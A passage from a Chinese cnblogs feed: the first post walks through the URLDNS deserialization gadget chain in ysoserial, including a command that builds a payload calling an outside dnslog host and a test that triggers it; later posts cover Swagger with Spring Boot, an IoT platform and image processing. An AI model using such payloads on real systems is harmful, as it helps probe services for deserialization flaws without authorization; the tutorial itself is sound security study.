&lt;p&gt;点击Edit configurations，设置参数&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224337590-1705523014.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;再次运行就可以看到成功执行了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224349185-1961944419.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这样我们就获取到了一个序列化的数据。&lt;/p&gt;
&lt;p&gt;我们的ysoserial就能在idea里面去运行了。&lt;/p&gt;
&lt;h2 id=&quot;0x03-urldns链分析&quot;&gt;0x03 URLDNS链分析&lt;/h2&gt;
&lt;p&gt;URLDNS是ysoserial里面就简单的一条利用链，但URLDNS的利用效果是只能触发一次dns请求，而不能去执行命令。比较适用于漏洞验证这一块，而且URLDNS这条利用链并不依赖于第三方的类，而是JDK中内置的一些类和方法。&lt;/p&gt;
&lt;p&gt;在一些漏洞利用没有回显的时候，我们也可以使用到该链来验证漏洞是否存在，比如shiro反序列化就是使用dnslog来验证漏洞是否存在，（盲猜的，并没有去分析过，后面可以去分析一下）。&lt;/p&gt;
&lt;p&gt;下面先来使用ysoserial的URLDNS&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; java -jar .\ysoserial.jar URLDNS &quot;http://2mdw9p.dnslog.cn&quot;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224402767-1551469080.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;得到序列化后的数据，如果需要执行，我们需要对其进行反序列化，这里先不执行。先来看看在ysoserial中，该数据是怎么获取的。&lt;/p&gt;
&lt;p&gt;打开&lt;code&gt;ysoserial/payloads/URLDNS.java&lt;/code&gt;的源码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224414781-117351788.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上面的注释也写明白了他的调用链&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224423556-1204906879.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;具体怎么执行的我们还得去debug看。&lt;/p&gt;
&lt;p&gt;触发点在hashmap的put方法，我们在put地方打一个断点&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224435381-1514551164.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;来到hashmap的readobject中看到&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224445992-1674306948.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里使用了hash方法对key的值进行了处理，我们来跟踪一下hash这个方法看看他具体的实现&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224455513-1158283300.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里的key的是java.net.URL的实例对象调用了key的hashcode。再跟进一下他的hashcode方法。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224504410-2058097383.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224516155-1126176890.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在hashcode方法中还调用了handler的hashcode。先来跟踪一下hanler&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224536402-1965360307.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;调用 URLStreamHandler 的hashcode。进行跟踪URLStreamHandler.hashcode。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224546914-1375121936.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;跟进一下getProtocol方法&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224554919-721653795.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在jdk的api文档里面写着该方法是用来获取协议的名称的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224603088-1930468076.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;回到刚刚的地方&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224612045-819662656.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;再来跟踪一下getHostAddress&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224632707-2080751262.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;来到这里后，可以发现会调用&lt;code&gt;getHost&lt;/code&gt;、&lt;code&gt;getByName&lt;/code&gt;这两个方法。&lt;/p&gt;
&lt;p&gt;JDKapi文档查看 InetAddress.getByName方法&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224640860-290030426.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;该方法会使用远程请求，进行获取主机的ip，那么这时候就会触发一次请求，到了这里我们的dnslog平台，就可以收到响应了。这就是这个URLDNS链的一个触发点。&lt;/p&gt;
&lt;h3 id=&quot;调用链：&quot;&gt;调用链：&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;HashMap.readObject() -&amp;gt;  HashMap.putVal() -&amp;gt; HashMap.hash() 
-&amp;gt; URL.hashCode()-&amp;gt;URLStreamHandler.hashCode().getHostAddress
-&amp;gt;URLStreamHandler.hashCode().getHostAddress
-&amp;gt;URLStreamHandler.hashCode().getHostAddress.InetAddress.getByName
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;下面来测试一下&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;import java.io.*;

public class main {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(&quot;out.bin&quot;);
        ObjectInputStream bit = new ObjectInputStream(fis);
        bit.readObject();
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;执行后再看我们的dnslog平台&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224652993-362764993.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;在URLDNS里面其实导致反序列化的根本原因是因为hashmap重写了readobject反序列化方法，而重写后的readobject方法调用了putVal导致的一个利用链&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;参考文章&quot;&gt;参考文章&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;https://www.cnblogs.com/kuaile1314/p/13690210.html
https://www.cnblogs.com/ph4nt0mer/p/11994384.html
https://www.cnblogs.com/v1ntlyn/p/13549991.html
https://zhuanlan.zhihu.com/p/30045174
https://www.cnblogs.com/litlife/p/12596286.html
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;0x04-结尾&quot;&gt;0x04 结尾&lt;/h2&gt;
&lt;p&gt;其实调试URLDNS这条链相对来说是比较简单的，虽然前面也花了不少时间去摸索,参考了大量的文章。但是等明白了后，发现其实URLDNS链还是比较简单的。&lt;/p&gt;
</description>
<pubDate>Mon, 05 Oct 2020 16:52:00 +0000</pubDate>
<dc:creator>nice_0e3</dc:creator>
<og:description>Java安全之URLDNS链 0x00 前言 在学习Java的反序列化漏洞的时候，就不得不学习他的一个利用链。很多刚刚入门的对于利用链这个词可能比较陌生。那么这里先来了解一下Java反序列化和反序列化</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/nice0e3/p/13772184.html</dc:identifier>
</item>
<item>
<title>spring-boot-route（五）整合Swagger生成接口文档 - Java旅途</title>
<link>http://www.cnblogs.com/zhixie/p/13772148.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhixie/p/13772148.html</guid>
<description>&lt;p&gt;目前，大多数公司都采用了前后端分离的开发模式，为了解决前后端人员的沟通问题，后端人员在开发接口的时候会选择使用swagger2来生成对应的接口文档，swagger2提供了强大的页面调试功能，这样可以有效解决前后端人员沟通难的问题。&lt;/p&gt;
&lt;p&gt;下面我们使用SpringBoot结合swagger2生成Restful API文档。&lt;/p&gt;
&lt;h3 id=&quot;一-搭建项目，引入依赖&quot;&gt;一 搭建项目，引入依赖&lt;/h3&gt;
&lt;p&gt;新建一个&lt;code&gt;spring-boot-swaager&lt;/code&gt;的项目，引入swaager2的依赖，由于swagger2的ui不是很美观，这里将使用开源的&lt;code&gt;swagger-bootstrap-ui&lt;/code&gt;做为ui。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;引入依赖&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;&amp;lt;!-- swaager2依赖 --&amp;gt;    
&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;io.springfox&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;springfox-swagger2&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;2.9.2&amp;lt;/version&amp;gt;
&amp;lt;/dependency&amp;gt;
&amp;lt;!-- swaager2ui --&amp;gt;
&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;com.github.xiaoymin&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;swagger-bootstrap-ui&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;1.9.6&amp;lt;/version&amp;gt;
&amp;lt;/dependency&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;项目中配置swagger相关信息&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Configuration
@EnableSwagger2
public class configuration {

    @Bean
    public Docket createRestApi(){
        return new Docket(DocumentationType.SWAGGER_2)
                .apiInfo(apiInfo())
                .select()
                .apis(RequestHandlerSelectors.basePackage(&quot;com.javatrip.swagger.controller&quot;))
                .paths(PathSelectors.any())
                .build();
    }

    private ApiInfo apiInfo(){
        return new ApiInfoBuilder()
                // 标题
                .title(&quot;某某项目接口文档&quot;)
                // 描述
                .description(&quot;swagger2接口文档使用演示&quot;)
                // 版本
                .version(&quot;1.0&quot;)
                // 许可证
                .license(&quot;MIT&quot;)
                // 许可证地址
                .licenseUrl(&quot;www.xx.com&quot;)
                // 服务端地址
                .termsOfServiceUrl(&quot;https://www.cnblogs.com/zhixie/&quot;)
                // 联系信息
                .contact(new Contact(&quot;java旅途&quot;,&quot;https://www.cnblogs.com/zhixie/&quot;,&quot;binzh303@163.com&quot;))
                .build();
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;访问路径，查看生成效果&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;文章中使用的这个ui，接口文档地址为&lt;code&gt;ip:port/doc.html&lt;/code&gt;，生成的文档信息如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1719198/202010/1719198-20201006001126958-1412347851.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;二-编写restful接口&quot;&gt;二 编写Restful接口&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;新建实体类&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@ApiModel(&quot;用户实体类&quot;)
@Data
@NoArgsConstructor
@AllArgsConstructor
public class Person {
    @ApiModelProperty(&quot;姓名&quot;)
    private String name;
    @ApiModelProperty(value = &quot;年龄&quot;)
    private int age;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;新建Restful接口&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Api(tags = &quot;用户接口&quot;)
@RestController
@RequestMapping(&quot;person&quot;)
public class PersonController {

    @ApiOperation(value = &quot;获取用户列表&quot;,notes = &quot;根据name获取用户列表&quot;)
    @ApiImplicitParams({
            @ApiImplicitParam(name = &quot;name&quot;,value = &quot;用户姓名&quot;,dataType = &quot;String&quot;,required = true),
            @ApiImplicitParam(name = &quot;age&quot;,value = &quot;年龄&quot;,dataType = &quot;int&quot;,required = true)
    })
    @GetMapping(&quot;/{name}&quot;)
    public Person getPerson(@PathVariable(&quot;name&quot;) String name,@RequestParam int age){
        return new Person(name,age);
    }

    @ApiOperation(value = &quot;新增用户&quot;,notes = &quot;根据用户实体类新增用户&quot;)
    @ApiImplicitParam(name = &quot;person&quot;,value = &quot;用户实体类&quot;,dataType = &quot;Person&quot;,required = true)
    @PostMapping(&quot;add&quot;)
    public int addPerson(@RequestBody Person person){
        if(StringUtils.isEmpty(person)){
            return -1;
        }
        return 1;
    }

    @ApiOperation(value = &quot;更新用户信息&quot;,notes = &quot;根据用户实体更新用户信息&quot;)
    @ApiImplicitParam(name = &quot;person&quot;,value = &quot;用户实体类&quot;,dataType = &quot;Person&quot;,required = true)
    @PutMapping(&quot;update&quot;)
    public int updatePerson(@RequestBody Person person){
        if(StringUtils.isEmpty(person)){
            return -1;
        }
        return 1;
    }

    @ApiOperation(value = &quot;删除用户信息&quot;,notes = &quot;根据用户名删除用户信息&quot;)
    @ApiImplicitParam(name = &quot;name&quot;,value = &quot;用户姓名&quot;,dataType = &quot;String&quot;,required = true)
    @DeleteMapping(&quot;/{name}&quot;)
    public int deletePerson(@PathVariable(name = &quot;name&quot;) String name){
        if(StringUtils.isEmpty(name)){
            return -1;
        }
        return 1;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;三-swagger文档简介&quot;&gt;三 swagger文档简介&lt;/h3&gt;
&lt;p&gt;我就直接用图来表示了，这样看着也更加直观&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1719198/202010/1719198-20201006001145223-1187525431.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1719198/202010/1719198-20201006001202385-1722148301.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;swagger2注解对应到文档上的表现形式如上。swagger2支持在线调试，打开某个具体的接口，根据提示填写对应的参数，点击发送就可返回响应结果。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1719198/202010/1719198-20201006001227983-932615173.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;此是spring-boot-route系列的第五篇文章，这个系列的文章都比较简单，主要目的就是为了帮助初次接触Spring Boot 的同学有一个系统的认识。本文已收录至我的&lt;a href=&quot;https://github.com/binzh303/spring-boot-route&quot;&gt;github&lt;/a&gt;，欢迎各位小伙伴&lt;code&gt;star&lt;/code&gt;！&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;github&lt;/strong&gt;：&lt;a href=&quot;https://github.com/binzh303/spring-boot-route&quot;&gt;https://github.com/binzh303/spring-boot-route&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;点关注、不迷路&quot;&gt;点关注、不迷路&lt;/h2&gt;
&lt;p&gt;如果觉得文章不错，欢迎&lt;strong&gt;关注&lt;/strong&gt;、&lt;strong&gt;点赞&lt;/strong&gt;、&lt;strong&gt;收藏&lt;/strong&gt;，你们的支持是我创作的动力，感谢大家。&lt;/p&gt;
&lt;p&gt;如果文章写的有问题，请不要吝啬，欢迎留言指出，我会及时核查修改。&lt;/p&gt;
&lt;p&gt;如果你还想更加深入的了解我，可以微信搜索「&lt;strong&gt;Java旅途&lt;/strong&gt;」进行关注。回复「&lt;strong&gt;1024&lt;/strong&gt;」即可获得学习视频及精美电子书。每天7:30准时推送技术文章，让你的上班路不在孤独，而且每月还有送书活动，助你提升硬实力！&lt;/p&gt;
</description>
<pubDate>Mon, 05 Oct 2020 16:13:00 +0000</pubDate>
<dc:creator>Java旅途</dc:creator>
<og:description>目前，大多数公司都采用了前后端分离的开发模式，为了解决前后端人员的沟通问题，后端人员在开发接口的时候会选择使用swagger2来生成对应的接口文档，swagger2提供了强大的页面调试功能，这样可以有</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/zhixie/p/13772148.html</dc:identifier>
</item>
<item>
<title>iNeuOS工业互联平台，在“智慧”楼宇、园区等领域的应用 - 唯笑志在-ineuos.net</title>
<link>http://www.cnblogs.com/lsjwq/p/13772122.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lsjwq/p/13772122.html</guid>
<description>&lt;p class=&quot;a&quot;&gt;&lt;span&gt;目       录&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.      概述... 1&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.      平台演示... 2&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;3.      硬件网关... 2&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;4.      平台接入硬件网关... 4&lt;/span&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt; &lt;span&gt;1.      概述&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span&gt;      “智慧”一词有点被用烂的味道，所以在标题中打了引号。换个角度，如果为甲方提供强大而低成本的平台，那么也算是一种“智慧”。iNeuOS工业互联网平台完全适用于楼宇、园区等领域的应用，业务方面：安防、消防、设备运维、人员管理等，数据方面：风、水、电、气等相关的开关量和模拟量。数据接入支持传感器与平台直接进行数据交换、支持硬件数据透传模块（例如：RS485转RJ45等）与平台直接进行数据交换、支持硬件网关分布式数据采集后与平台直接进行数据交换；数据存储支持分布式的关系数据库和时序数据库大规模永久存储数据；数据展示有组态和BI分析工具快速构建业务；特定的业务功能需要定制化开发，特别是3D展示部分需要根据现场的业务场景进行构建。&lt;/span&gt;&lt;/p&gt;
&lt;blockquote&gt;

&lt;/blockquote&gt;
&lt;p&gt;&lt;span&gt;     在线演示：&lt;a href=&quot;http://demo.ineuos.net&quot;&gt;http://demo.ineuos.net&lt;/a&gt;  （注：自已注册用户，体验系统功能）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;     视频介绍：&lt;a href=&quot;https://v.qq.com/x/page/c3107nnfvt5.html&quot;&gt;https://v.qq.com/x/page/c3107nnfvt5.html&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;blockquote&gt;

&lt;/blockquote&gt;
&lt;p&gt;&lt;span&gt;      硬件网关种类比较多，现在的市场竞争压力也比较大，滥竽充数的也比较多，质量参差不齐。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;      我们一般把硬件网关分为：工业的网关和民用的网关，主要区别在于满足不同领域应用情况下的成本高低的问题。所以针对楼宇和小微园区的硬件网关相较于工业应用的硬件网关成本要低很多，但是可以满足现场的应用需求和条件。各种的硬件配置都有，主要看现场的应用场景和需求。基本版本的硬件网关，RS485、RJ45、开关量等，如下图：&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/279374/202010/279374-20201005235146692-345357300.png&quot; width=&quot;300&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;  &lt;span&gt;     默认IP地址：192.168.8.10，用户名称和密码：admin。基本配置为了三步。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;     第一步，配置采集数据通讯链路，如下图：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/279374/202010/279374-20201005235225127-1039101373.png&quot; width=&quot;800&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;  &lt;span&gt;     第二步，配置数据采集点，如下图：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/279374/202010/279374-20201005235303579-1912493706.png&quot; width=&quot;800&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;  &lt;span&gt;     第三步，配置数据转发，可以通过有线、4G或LoRa组网等方式传输数据，与iNeuOS平台数据交换，如下图：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/279374/202010/279374-20201005235331887-10740008.png&quot; width=&quot;800&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;blockquote&gt;

&lt;/blockquote&gt;
&lt;p&gt;&lt;span&gt;     硬件网关使用统一的协议与iNeuOS平台进行数据交换，为了保障数据交换的实时性、可用性、稳定性等，要求交换协议要考虑到所有的应用场景，并且具备可扩展性。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;     只需要在iNeuOS平台的设备容器中增加DM101的协议驱动就可以完成对网关数据的接入，设备和数据点的信息会自动从硬件网关同步到平台中，配置如下图：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/279374/202010/279374-20201005235424520-75710790.png&quot; width=&quot;800&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;   &lt;span&gt;  数据存储在数据库中，如下图：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/279374/202010/279374-20201005235457808-999268950.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    后续的数据监测和分析的业务，可以使用组态工具和BI分析工具进行构建。&lt;/span&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;物联网&amp;amp;大数据技术 QQ群：&lt;span&gt;54256083&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;物联网&amp;amp;大数据合作 QQ群：727664080&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;网站：&lt;a href=&quot;http://www.ineuos.net&quot; target=&quot;_blank&quot;&gt;http://www.ineuos.net&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;span&gt;联系QQ：504547114&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;合作微信：wxzz0151&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;官方博客：&lt;a href=&quot;https://www.cnblogs.com/lsjwq&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/lsjwq&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Mon, 05 Oct 2020 15:56:00 +0000</pubDate>
<dc:creator>唯笑志在-ineuos.net</dc:creator>
<og:description>目 录 1. 概述... 1 2. 平台演示... 2 3. 硬件网关... 2 4. 平台接入硬件网关... 4 1. 概述 “智慧”一词有点被用烂的味道，所以在标题中打了引号。换个角度，如果为甲方</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/lsjwq/p/13772122.html</dc:identifier>
</item>
<item>
<title>图像处理的基础知识(5)——绘制图像(1) - JERRY_Z</title>
<link>http://www.cnblogs.com/JERRY-Z-J-R/p/13772107.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/JERRY-Z-J-R/p/13772107.html</guid>
<description>&lt;hr/&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;JERRY_Z. ~ 2020 / 10 / 5&lt;br/&gt;转载请注明出处！❤️&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr/&gt;
&lt;hr/&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201005234058614.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Rfc2lfR29k,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201005234144219.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Rfc2lfR29k,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201005234420885.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Rfc2lfR29k,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201005234452484.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Rfc2lfR29k,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201005234642788.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Rfc2lfR29k,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201005234717521.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Rfc2lfR29k,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;&lt;mark&gt;&lt;em&gt;交流方式：&lt;/em&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;❤️ ❤️ ❤️&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;QQ：&lt;/strong&gt; 1846334075&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;WeChat：&lt;/strong&gt; zhoujirui54&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CSDN：&lt;/strong&gt;&lt;a href=&quot;https://blog.csdn.net/D_si_God&quot;&gt;https://blog.csdn.net/D_si_God&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Cnblogs：&lt;/strong&gt;&lt;a href=&quot;https://www.cnblogs.com/JERRY-Z-J-R/&quot;&gt;https://www.cnblogs.com/JERRY-Z-J-R/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;GitHub：&lt;/strong&gt;&lt;a href=&quot;https://github.com/JERRY-Z-J-R&quot;&gt;https://github.com/JERRY-Z-J-R&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Gitee：&lt;/strong&gt;&lt;a href=&quot;https://gitee.com/JERRY-Z-J-R&quot;&gt;https://gitee.com/JERRY-Z-J-R&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 05 Oct 2020 15:49:00 +0000</pubDate>
